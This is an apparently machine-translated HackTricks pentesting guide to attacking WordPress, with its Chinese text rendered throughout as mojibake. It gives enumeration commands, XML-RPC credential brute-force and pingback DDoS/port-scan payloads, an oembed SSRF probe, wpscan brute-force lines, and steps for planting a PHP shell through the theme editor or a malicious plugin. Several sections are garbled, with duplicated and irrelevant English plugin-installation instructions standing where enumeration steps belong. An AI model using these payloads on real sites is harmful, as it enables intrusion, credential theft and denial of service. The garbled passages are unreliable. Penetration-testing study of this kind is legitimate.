# Wordpress

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ–è€… [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–è€…**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œ**è‡ªåŠ¨åŒ–å·¥ä½œæµç¨‹**ï¼Œä½¿ç”¨å…¨çƒ**æœ€å…ˆè¿›**çš„ç¤¾åŒºå·¥å…·ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## åŸºæœ¬ä¿¡æ¯

**ä¸Šä¼ **çš„æ–‡ä»¶ä¿å­˜åœ¨ï¼š`http://10.10.10.10/wp-content/uploads/2018/08/a.txt`\
**ä¸»é¢˜æ–‡ä»¶å¯ä»¥åœ¨/wp-content/themes/ä¸­æ‰¾åˆ°**ï¼Œæ‰€ä»¥å¦‚æœä½ æ›´æ”¹äº†ä¸»é¢˜çš„æŸäº›phpæ–‡ä»¶ä»¥è·å–RCEï¼Œä½ å¯èƒ½ä¼šä½¿ç”¨è¯¥è·¯å¾„ã€‚ä¾‹å¦‚ï¼šä½¿ç”¨**twentytwelveä¸»é¢˜**ï¼Œä½ å¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®è®¿é—®**404.php**æ–‡ä»¶ï¼š[**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)\
**å¦ä¸€ä¸ªæœ‰ç”¨çš„URLå¯èƒ½æ˜¯ï¼š**[**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

åœ¨**wp-config.php**ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ°æ•°æ®åº“çš„æ ¹å¯†ç ã€‚

è¦æ£€æŸ¥çš„é»˜è®¤ç™»å½•è·¯å¾„ï¼š_**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **ä¸»è¦çš„WordPressæ–‡ä»¶**

* `index.php`
* `license.txt`åŒ…å«æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå¦‚å®‰è£…çš„WordPressç‰ˆæœ¬ã€‚
* `wp-activate.php`ç”¨äºè®¾ç½®æ–°çš„WordPressç«™ç‚¹æ—¶çš„ç”µå­é‚®ä»¶æ¿€æ´»è¿‡ç¨‹ã€‚
* ç™»å½•æ–‡ä»¶å¤¹ï¼ˆå¯èƒ½å·²é‡å‘½åä»¥éšè—ï¼‰ï¼š
* `/wp-admin/login.php`
* `/wp-admin/wp-login.php`
* `/login.php`
* `/wp-login.php`
* `xmlrpc.php`æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œä»£è¡¨äº†WordPressçš„ä¸€ä¸ªåŠŸèƒ½ï¼Œå®ƒä½¿æ•°æ®èƒ½å¤Ÿé€šè¿‡HTTPè¿›è¡Œä¼ è¾“ï¼ŒHTTPå……å½“ä¼ è¾“æœºåˆ¶ï¼ŒXMLå……å½“ç¼–ç æœºåˆ¶ã€‚è¿™ç§ç±»å‹çš„é€šä¿¡å·²è¢«WordPressçš„[REST API](https://developer.wordpress.org/rest-api/reference)å–ä»£ã€‚
* `wp-content`æ–‡ä»¶å¤¹æ˜¯å­˜å‚¨æ’ä»¶å’Œä¸»é¢˜çš„ä¸»ç›®å½•ã€‚
* `wp-content/uploads/`æ˜¯å­˜å‚¨ä¸Šä¼ åˆ°å¹³å°çš„ä»»ä½•æ–‡ä»¶çš„ç›®å½•ã€‚
* `wp-includes/`è¿™æ˜¯å­˜å‚¨æ ¸å¿ƒæ–‡ä»¶çš„ç›®å½•ï¼Œå¦‚è¯ä¹¦ã€å­—ä½“ã€JavaScriptæ–‡ä»¶å’Œå°éƒ¨ä»¶ã€‚

**æ¸—é€å**

* `wp-config.php`æ–‡ä»¶åŒ…å«WordPressè¿æ¥åˆ°æ•°æ®åº“æ‰€éœ€çš„ä¿¡æ¯ï¼Œå¦‚æ•°æ®åº“åç§°ã€æ•°æ®åº“ä¸»æœºã€ç”¨æˆ·åå’Œå¯†ç ã€èº«ä»½éªŒè¯å¯†é’¥å’Œç›ä»¥åŠæ•°æ®åº“è¡¨å‰ç¼€ã€‚è¿™ä¸ªé…ç½®æ–‡ä»¶è¿˜å¯ä»¥ç”¨äºæ¿€æ´»DEBUGæ¨¡å¼ï¼Œè¿™åœ¨æ•…éšœæ’é™¤ä¸­å¾ˆæœ‰ç”¨ã€‚

### ç”¨æˆ·æƒé™

* **ç®¡ç†å‘˜**
* **ç¼–è¾‘**ï¼šå‘å¸ƒå’Œç®¡ç†è‡ªå·±å’Œå…¶ä»–äººçš„å¸–å­
* **ä½œè€…**ï¼šå‘å¸ƒå’Œç®¡ç†è‡ªå·±çš„å¸–å­
* **è´¡çŒ®è€…**ï¼šç¼–å†™å’Œç®¡ç†è‡ªå·±çš„å¸–å­ï¼Œä½†ä¸èƒ½å‘å¸ƒ
* **è®¢é˜…è€…**ï¼šæµè§ˆå¸–å­å¹¶ç¼–è¾‘è‡ªå·±çš„ä¸ªäººèµ„æ–™

## **è¢«åŠ¨æšä¸¾**

### **è·å–WordPressç‰ˆæœ¬**

æ£€æŸ¥æ˜¯å¦å¯ä»¥æ‰¾åˆ°æ–‡ä»¶`/license.txt`æˆ–`/readme.html`

åœ¨é¡µé¢çš„**æºä»£ç **ä¸­ï¼ˆä¾‹å¦‚æ¥è‡ª[https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)çš„ç¤ºä¾‹ï¼‰ï¼š

* grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
### è·å–æ’ä»¶

To get the plugins, you can follow these steps:

1. Access the WordPress admin dashboard.
2. Go to the "Plugins" section.
3. Click on the "Add New" button.
4. Search for the desired plugin using the search bar.
5. Once you find the plugin, click on the "Install Now" button.
6. After the installation is complete, click on the "Activate" button to activate the plugin.

### è·å–æ’ä»¶

è¦è·å–æ’ä»¶ï¼Œæ‚¨å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤è¿›è¡Œæ“ä½œï¼š

1. è®¿é—®WordPressç®¡ç†åå°ã€‚
2. è¿›å…¥â€œæ’ä»¶â€éƒ¨åˆ†ã€‚
3. ç‚¹å‡»â€œæ·»åŠ æ–°æ’ä»¶â€æŒ‰é’®ã€‚
4. ä½¿ç”¨æœç´¢æ æœç´¢æ‰€éœ€çš„æ’ä»¶ã€‚
5. æ‰¾åˆ°æ’ä»¶åï¼Œç‚¹å‡»â€œç«‹å³å®‰è£…â€æŒ‰é’®ã€‚
6. å®‰è£…å®Œæˆåï¼Œç‚¹å‡»â€œæ¿€æ´»â€æŒ‰é’®ä»¥æ¿€æ´»æ’ä»¶ã€‚
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
To get themes for your WordPress website, you can follow these steps:

1. Go to the WordPress admin dashboard.
2. Click on "Appearance" in the left-hand menu.
3. Select "Themes" from the dropdown menu.
4. You will see a list of available themes. You can browse through them or use the search bar to find a specific theme.
5. Once you find a theme you like, click on the "Preview" button to see how it will look on your website.
6. If you are satisfied with the preview, click on the "Install" button to add the theme to your website.
7. After the theme is installed, click on the "Activate" button to make it the active theme for your website.

That's it! You have successfully obtained and installed a new theme for your WordPress website.
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### æå–ç‰ˆæœ¬ä¿¡æ¯

To extract the version of WordPress being used on a website, you can follow these steps:

1. **Manual Inspection**: Look for any version information displayed on the website's frontend or backend. This could be found in the footer, admin dashboard, or any other visible area.

2. **Page Source**: View the page source code by right-clicking on the webpage and selecting "View Page Source" or using the browser's developer tools. Search for keywords like "version" or "wp-version" to find any references to the WordPress version.

3. **Readme.html**: WordPress installations often include a readme.html file. Access this file by appending "/readme.html" to the website's URL (e.g., `http://example.com/readme.html`). The WordPress version may be mentioned in this file.

4. **Readme.txt**: Some WordPress installations have a readme.txt file in the root directory. You can access it by appending "/readme.txt" to the website's URL (e.g., `http://example.com/readme.txt`). Look for the version information in this file.

5. **Version Checkers**: There are online tools and plugins available that can check the WordPress version of a website by simply entering its URL. These tools can provide accurate results and save time.

Remember, it is important to keep your WordPress installation up to date to ensure security and prevent vulnerabilities associated with older versions.
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒæœ€å…ˆè¿›çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## ä¸»åŠ¨æšä¸¾

### æ’ä»¶å’Œä¸»é¢˜

æ‚¨å¯èƒ½æ— æ³•æ‰¾åˆ°æ‰€æœ‰å¯èƒ½çš„æ’ä»¶å’Œä¸»é¢˜ã€‚ä¸ºäº†å‘ç°å®ƒä»¬çš„å…¨éƒ¨ï¼Œæ‚¨éœ€è¦**ä¸»åŠ¨æš´åŠ›ç ´è§£æ’ä»¶å’Œä¸»é¢˜çš„åˆ—è¡¨**ï¼ˆå¹¸è¿çš„æ˜¯ï¼Œæœ‰è‡ªåŠ¨åŒ–å·¥å…·åŒ…å«äº†è¿™äº›åˆ—è¡¨ï¼‰ã€‚

### ç”¨æˆ·

**IDæš´åŠ›ç ´è§£**

é€šè¿‡æš´åŠ›ç ´è§£ç”¨æˆ·IDï¼Œæ‚¨å¯ä»¥è·å–WordPressç½‘ç«™ä¸Šçš„æœ‰æ•ˆç”¨æˆ·ï¼š
```
curl -s -I -X GET http://blog.example.com/?author=1
```
å¦‚æœå“åº”æ˜¯ **200** æˆ– **30X**ï¼Œé‚£æ„å‘³ç€è¯¥ id æ˜¯ **æœ‰æ•ˆ** çš„ã€‚å¦‚æœå“åº”æ˜¯ **400**ï¼Œé‚£ä¹ˆè¯¥ id æ˜¯ **æ— æ•ˆ** çš„ã€‚

**wp-json**

æ‚¨è¿˜å¯ä»¥å°è¯•é€šè¿‡æŸ¥è¯¢æ¥è·å–æœ‰å…³ç”¨æˆ·çš„ä¿¡æ¯ï¼š
```
curl http://blog.example.com/wp-json/wp/v2/users
```
**åªæä¾›å¯ç”¨äº†æ­¤åŠŸèƒ½çš„ç”¨æˆ·çš„ä¿¡æ¯**ã€‚

è¿˜è¦æ³¨æ„ï¼Œ**/wp-json/wp/v2/pages**å¯èƒ½ä¼šæ³„éœ²IPåœ°å€ã€‚

#### ç™»å½•ç”¨æˆ·åæšä¸¾

å½“ç™»å½•åˆ°**`/wp-login.php`**æ—¶ï¼Œ**æ¶ˆæ¯**ä¼šæ ¹æ®æŒ‡å®šçš„**ç”¨æˆ·åæ˜¯å¦å­˜åœ¨**è€Œæœ‰æ‰€ä¸åŒã€‚

### XML-RPC

å¦‚æœ`xml-rpc.php`å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œå‡­æ®æš´åŠ›ç ´è§£æˆ–ä½¿ç”¨å®ƒæ¥å‘åŠ¨å¯¹å…¶ä»–èµ„æºçš„DoSæ”»å‡»ï¼ˆä¾‹å¦‚ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨[è¿™ä¸ª](https://github.com/relarizky/wpxploit)æ¥è‡ªåŠ¨åŒ–æ­¤è¿‡ç¨‹ï¼‰ã€‚

è¦æŸ¥çœ‹å®ƒæ˜¯å¦å¤„äºæ´»åŠ¨çŠ¶æ€ï¼Œè¯·å°è¯•è®¿é—®_**/xmlrpc.php**_å¹¶å‘é€æ­¤è¯·æ±‚ï¼š

**æ£€æŸ¥**
```markup
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**å‡­è¯æš´åŠ›ç ´è§£**

**`wp.getUserBlogs`**ã€**`wp.getCategories`**æˆ–**`metaWeblog.getUsersBlogs`**æ˜¯ä¸€äº›å¯ä»¥ç”¨äºæš´åŠ›ç ´è§£å‡­è¯çš„æ–¹æ³•ã€‚å¦‚æœä½ èƒ½æ‰¾åˆ°å…¶ä¸­ä»»ä½•ä¸€ä¸ªï¼Œä½ å¯ä»¥å‘é€ç±»ä¼¼ä»¥ä¸‹å†…å®¹çš„è¯·æ±‚ï¼š
```markup
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
å¦‚æœå‡­æ®æ— æ•ˆï¼Œåº”è¯¥åœ¨200çŠ¶æ€ç çš„å“åº”ä¸­æ˜¾ç¤ºæ¶ˆæ¯_"ç”¨æˆ·åæˆ–å¯†ç ä¸æ­£ç¡®"_ã€‚

![](<../../.gitbook/assets/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (4).png>)

![](<../../.gitbook/assets/image (102).png>)

ä½¿ç”¨æ­£ç¡®çš„å‡­æ®ï¼Œæ‚¨å¯ä»¥ä¸Šä¼ æ–‡ä»¶ã€‚åœ¨å“åº”ä¸­ï¼Œè·¯å¾„å°†æ˜¾ç¤ºä¸º([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))ã€‚
```markup
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
åŒæ—¶ï¼Œè¿˜æœ‰ä¸€ç§æ›´å¿«çš„æ–¹æ³•å¯ä»¥ä½¿ç”¨`system.multicall`æ¥æš´åŠ›ç ´è§£å‡­æ®ï¼Œå› ä¸ºæ‚¨å¯ä»¥åœ¨åŒä¸€ä¸ªè¯·æ±‚ä¸­å°è¯•å¤šä¸ªå‡­æ®ï¼š

<figure><img src="../../.gitbook/assets/image (188).png" alt=""><figcaption></figcaption></figure>

**ç»•è¿‡åŒå› ç´ è®¤è¯**

æ­¤æ–¹æ³•é€‚ç”¨äºç¨‹åºè€Œéäººç±»ï¼Œå¹¶ä¸”å·²ç»è¿‡æ—¶ï¼Œå› æ­¤ä¸æ”¯æŒåŒå› ç´ è®¤è¯ã€‚å› æ­¤ï¼Œå¦‚æœæ‚¨æ‹¥æœ‰æœ‰æ•ˆçš„å‡­æ®ä½†ä¸»å…¥å£å—åˆ°åŒå› ç´ è®¤è¯çš„ä¿æŠ¤ï¼Œ**æ‚¨å¯èƒ½èƒ½å¤Ÿæ»¥ç”¨xmlrpc.phpä»¥ç»•è¿‡åŒå› ç´ è®¤è¯è¿›è¡Œç™»å½•**ã€‚è¯·æ³¨æ„ï¼Œæ‚¨å°†æ— æ³•æ‰§è¡Œé€šè¿‡æ§åˆ¶å°å¯ä»¥æ‰§è¡Œçš„æ‰€æœ‰æ“ä½œï¼Œä½†æ‚¨å¯èƒ½ä»ç„¶èƒ½å¤Ÿå®ç°RCEï¼Œå°±åƒIppsecåœ¨[https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s)ä¸­æ‰€è§£é‡Šçš„é‚£æ ·ã€‚

**DDoSæˆ–ç«¯å£æ‰«æ**

å¦‚æœæ‚¨å¯ä»¥åœ¨åˆ—è¡¨ä¸­æ‰¾åˆ°æ–¹æ³•_**pingback.ping**_ï¼Œåˆ™å¯ä»¥è®©WordPresså‘ä»»ä½•ä¸»æœº/ç«¯å£å‘é€ä»»æ„è¯·æ±‚ã€‚\
è¿™å¯ä»¥ç”¨äºè¦æ±‚**æ•°åƒä¸ª**WordPress**ç«™ç‚¹**è®¿é—®ä¸€ä¸ª**ä½ç½®**ï¼ˆä»è€Œåœ¨è¯¥ä½ç½®å¼•èµ·**DDoS**ï¼‰ï¼Œæˆ–è€…æ‚¨å¯ä»¥ä½¿ç”¨å®ƒæ¥ä½¿**WordPress**æ‰«æä¸€äº›å†…éƒ¨**ç½‘ç»œ**ï¼ˆæ‚¨å¯ä»¥æŒ‡å®šä»»ä½•ç«¯å£ï¼‰ã€‚
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../.gitbook/assets/1\_JaUYIZF8ZjDGGB7ocsZC-g.png)

å¦‚æœä½ å¾—åˆ°çš„**faultCode**å€¼**å¤§äº**0ï¼ˆ17ï¼‰ï¼Œé‚£æ„å‘³ç€ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚

è¯·å‚è€ƒå‰ä¸€èŠ‚ä¸­å¯¹**`system.multicall`**çš„ä½¿ç”¨ï¼Œäº†è§£å¦‚ä½•æ»¥ç”¨è¯¥æ–¹æ³•æ¥å‘èµ· DDoS æ”»å‡»ã€‚

**DDoS**
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../.gitbook/assets/image (103).png>)

### wp-cron.php DoS

è¯¥æ–‡ä»¶é€šå¸¸ä½äºWordPressç½‘ç«™çš„æ ¹ç›®å½•ä¸‹ï¼š**`/wp-cron.php`**\
å½“è®¿é—®è¯¥æ–‡ä»¶æ—¶ï¼Œä¼šæ‰§è¡Œä¸€ä¸ªâ€œ**ç¹é‡**â€çš„MySQL **æŸ¥è¯¢**ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥åˆ©ç”¨å®ƒæ¥é€ æˆ**æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰**ã€‚\
æ­¤å¤–ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œ`wp-cron.php`ä¼šåœ¨æ¯æ¬¡é¡µé¢åŠ è½½æ—¶è°ƒç”¨ï¼ˆæ¯å½“å®¢æˆ·ç«¯è¯·æ±‚ä»»ä½•WordPressé¡µé¢æ—¶ï¼‰ï¼Œè¿™åœ¨é«˜æµé‡ç½‘ç«™ä¸Šå¯èƒ½ä¼šå¼•èµ·é—®é¢˜ï¼ˆDoSï¼‰ã€‚

å»ºè®®ç¦ç”¨Wp-Cronï¼Œå¹¶åœ¨ä¸»æœºå†…åˆ›å»ºä¸€ä¸ªçœŸæ­£çš„cronjobï¼Œä»¥åœ¨è§„å®šçš„æ—¶é—´é—´éš”å†…æ‰§è¡Œæ‰€éœ€çš„æ“ä½œï¼ˆè€Œä¸ä¼šå¼•èµ·é—®é¢˜ï¼‰ã€‚

### /wp-json/oembed/1.0/proxy - SSRF

å°è¯•è®¿é—®_https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ï¼ŒWordPressç½‘ç«™å¯èƒ½ä¼šå‘æ‚¨å‘å‡ºè¯·æ±‚ã€‚

å½“å®ƒä¸èµ·ä½œç”¨æ—¶ï¼Œè¿™æ˜¯å“åº”ï¼š

![](<../../.gitbook/assets/image (184) (1).png>)

### SSRF

{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}

è¯¥å·¥å…·æ£€æŸ¥**methodName: pingback.ping**å’Œè·¯å¾„**/wp-json/oembed/1.0/proxy**æ˜¯å¦å­˜åœ¨ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™å°è¯•åˆ©ç”¨å®ƒä»¬ã€‚

### è‡ªåŠ¨åŒ–å·¥å…·
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒæœ€å…ˆè¿›çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## é€šè¿‡è¦†ç›–ä¸€ä¸ªä½è·å–è®¿é—®æƒé™

è¿™æ›´åƒæ˜¯ä¸€ç§å¥½å¥‡å¿ƒè€Œä¸æ˜¯çœŸæ­£çš„æ”»å‡»ã€‚åœ¨CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man)ä¸­ï¼Œæ‚¨å¯ä»¥ç¿»è½¬ä»»ä½•WordPressæ–‡ä»¶çš„1ä½ã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥ç¿»è½¬æ–‡ä»¶`/var/www/html/wp-includes/user.php`çš„ä½ç½®`5389`ä»¥ä½¿NOTï¼ˆ`!`ï¼‰æ“ä½œæ— æ•ˆã€‚
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **é¢æ¿è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰**

**ä¿®æ”¹ä½¿ç”¨çš„ä¸»é¢˜ä¸­çš„phpæ–‡ä»¶ï¼ˆéœ€è¦ç®¡ç†å‘˜å‡­æ®ï¼‰**

å¤–è§‚ â†’ ä¸»é¢˜ç¼–è¾‘å™¨ â†’ 404æ¨¡æ¿ï¼ˆåœ¨å³ä¾§ï¼‰

æ›´æ”¹php shellçš„å†…å®¹ï¼š

![](<../../.gitbook/assets/image (21) (1) (1).png>)

åœ¨äº’è”ç½‘ä¸Šæœç´¢å¦‚ä½•è®¿é—®æ›´æ–°åçš„é¡µé¢ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨éœ€è¦è®¿é—®æ­¤å¤„ï¼š[http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

æ‚¨å¯ä»¥ä½¿ç”¨ï¼š
```
use exploit/unix/webapp/wp_admin_shell_upload
```
## æ’ä»¶è¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆRCEï¼‰

### PHPæ’ä»¶

å¯èƒ½å¯ä»¥å°†.phpæ–‡ä»¶ä½œä¸ºæ’ä»¶ä¸Šä¼ ã€‚\
ä¾‹å¦‚ï¼Œä½¿ç”¨ä»¥ä¸‹ä»£ç åˆ›å»ºæ‚¨çš„phpåé—¨ï¼š

![](<../../.gitbook/assets/image (407).png>)

ç„¶åæ·»åŠ ä¸€ä¸ªæ–°çš„æ’ä»¶ï¼š

![](<../../.gitbook/assets/image (409).png>)

ä¸Šä¼ æ’ä»¶å¹¶ç‚¹å‡»ç«‹å³å®‰è£…ï¼š

![](<../../.gitbook/assets/image (411).png>)

ç‚¹å‡»"Procced"ï¼š

![](<../../.gitbook/assets/image (412).png>)

å¯èƒ½è¿™çœ‹èµ·æ¥ä¼¼ä¹æ²¡æœ‰ä»»ä½•ä½œç”¨ï¼Œä½†æ˜¯å¦‚æœæ‚¨è½¬åˆ°åª’ä½“åº“ï¼Œæ‚¨å°†çœ‹åˆ°æ‚¨ä¸Šä¼ çš„shellï¼š

![](<../../.gitbook/assets/image (413).png>)

è®¿é—®å®ƒï¼Œæ‚¨å°†çœ‹åˆ°æ‰§è¡Œåå‘shellçš„URLï¼š

![](<../../.gitbook/assets/image (414).png>)

### ä¸Šä¼ å’Œæ¿€æ´»æ¶æ„æ’ä»¶

**(æ­¤éƒ¨åˆ†å†…å®¹æ‘˜è‡ª** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)**)**

æœ‰æ—¶ç™»å½•ç”¨æˆ·æ²¡æœ‰å¯å†™æƒé™æ¥ä¿®æ”¹WordPressä¸»é¢˜ï¼Œå› æ­¤æˆ‘ä»¬é€‰æ‹©â€œæ³¨å…¥WPæ’ä»¶æ¶æ„ä»£ç â€ä½œä¸ºè·å–Web shellçš„æ›¿ä»£ç­–ç•¥ã€‚

å› æ­¤ï¼Œä¸€æ—¦æ‚¨å¯ä»¥è®¿é—®WordPressä»ªè¡¨æ¿ï¼Œæ‚¨å¯ä»¥å°è¯•å®‰è£…æ¶æ„æ’ä»¶ã€‚åœ¨è¿™é‡Œï¼Œæˆ‘å·²ç»ä»exploit dbä¸‹è½½äº†æ˜“å—æ”»å‡»çš„æ’ä»¶ã€‚

ç‚¹å‡»[**è¿™é‡Œ**](https://www.exploit-db.com/exploits/36374)ä¸‹è½½ç»ƒä¹ æ‰€éœ€çš„æ’ä»¶ã€‚

![](https://i1.wp.com/1.bp.blogspot.com/-Y\_Aw7zSFJZs/XY9pymSjdvI/AAAAAAAAguY/FGyGEzlx9VIqNYyyra9r55IklNmwXwMQwCLcBGAsYHQ/s1600/10.png?w=687\&ssl=1)

ç”±äºæˆ‘ä»¬æœ‰æ’ä»¶çš„zipæ–‡ä»¶ï¼Œç°åœ¨æ˜¯æ—¶å€™ä¸Šä¼ æ’ä»¶äº†ã€‚

ä»ªè¡¨æ¿ > æ’ä»¶ > ä¸Šä¼ æ’ä»¶

![](https://i0.wp.com/1.bp.blogspot.com/-FLhqB0I32Mg/XY9pyrlKWAI/AAAAAAAAguU/tofpIetTCv4Mho5y5D\_sDuuokC7mDmKowCLcBGAsYHQ/s1600/11.png?w=687\&ssl=1)

é€‰æ‹©ä¸‹è½½çš„zipæ–‡ä»¶ï¼Œå¦‚å›¾æ‰€ç¤ºã€‚

![](https://i2.wp.com/1.bp.blogspot.com/-KMumiwE2Tf0/XY9pzznEI4I/AAAAAAAAguk/BavBJP6plFo8NIpa38oWEKfx0jkOXv3HgCLcBGAsYHQ/s1600/12.png?w=687\&ssl=1)

